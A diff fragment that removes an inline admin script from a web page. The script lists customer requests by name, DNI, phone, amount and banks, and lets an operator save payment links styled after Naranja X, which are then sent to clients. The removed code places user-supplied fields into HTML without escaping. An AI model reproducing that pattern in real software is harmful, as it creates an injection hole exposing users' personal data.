-              <div class="font-bold text-slate-900">${req.name}</div>
-              <div class="text-xs text-slate-500">DNI: ${req.dni} | Tel: ${req.phone}</div>
-            </td>
-            <td class="p-4">
-              <div class="text-xs font-bold uppercase text-slate-500">${req.category === 'transfers' ? 'Devolución / Acreditación' : 'Pago de Resumen'}</div>
-              <div class="font-extrabold text-nxOrange-600">$${req.amount || '0'} <span class="text-xs font-normal text-slate-500">(${req.paymentType || 'N/A'})</span></div>
-            </td>
-            <td class="p-4 max-w-xs">${banksDisplay}</td>
-            <td class="p-4"><span class="px-2.5 py-1 rounded-full text-xs font-bold ${badgeColor}">${req.status}</span></td>
-            <td class="p-4">
-              <input type="url" id="url-${firebaseKey}" value="${req.paymentUrl || ''}" placeholder="https://link.naranjax.com/..." class="w-full px-3 py-2 bg-slate-50 border border-slate-300 rounded-lg text-xs focus:outline-none focus:border-nxOrange-500 transition">
-            </td>
-            <td class="p-4 text-right">
-              <button onclick="adminApp.savePaymentUrl('${firebaseKey}')" class="bg-nxOrange-500 hover:bg-nxOrange-600 text-white font-bold px-3.5 py-2 rounded-lg text-xs transition shadow-sm">
-                Guardar
-              </button>
-            </td>
-          `;
-          tbody.appendChild(tr);
-        });
-      },
-
-      async savePaymentUrl(firebaseKey) {
-        const urlInput = document.getElementById(`url-${firebaseKey}`);
-        const newUrl = urlInput.value.trim();
-
-        try {
-          await update(ref(db, 'requests/' + firebaseKey), {
-            paymentUrl: newUrl,
-            status: newUrl ? 'Link Generado' : 'Pendiente de Link'
-          });
-          alert('¡Enlace guardado y enviado al cliente automáticamente!');
-        } catch (error) {
-          alert('Error al guardar en Firebase.');
-        }
-      }
-    };
-
-    document.addEventListener('DOMContentLoaded', () => adminApp.init());
-  </script>
+  <script type="module" src="assets/js/main.js"></script>
 </body>
 </html>
